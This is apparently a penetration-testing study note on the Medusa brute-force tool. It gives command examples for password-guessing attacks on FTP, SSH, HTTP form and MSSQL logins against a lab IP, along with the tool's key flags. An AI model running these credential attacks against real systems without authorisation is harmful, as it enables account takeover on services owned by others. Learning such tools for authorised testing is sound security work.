---
tags: [basics, tool, brute-force]
---


> [!info] See also: [[Techniques/Password Cracking/Password Attacks]] · [[Login Brute Forcing]]



Parallel, modular brute-force tool. Supports many protocols: FTP, SSH, HTTP, SMB, MSSQL, MySQL, RDP, etc.

```bash
# Basic usage: -u user, -P wordlist, -h host, -M module
medusa -u fiona -P /usr/share/wordlists/rockyou.txt -h 10.129.203.7 -M ftp

# Multiple users from file (-U), single password (-p)
medusa -U users.txt -p Password123 -h 10.129.203.7 -M ssh

# Brute force HTTP form login
medusa -h 10.129.203.7 -U users.txt -P passwords.txt -M http -m FORM:"/login.php:user=^USER^&pass=^PASS^:Invalid"

# MSSQL brute force
medusa -h 10.129.203.7 -U users.txt -P passwords.txt -M mssql

# List available modules
medusa -d
```

Key flags:
- `-t` — number of parallel login attempts per host
- `-T` — number of parallel hosts to test
- `-f` — stop after first valid credential found
- `-v` — verbosity level (0-6)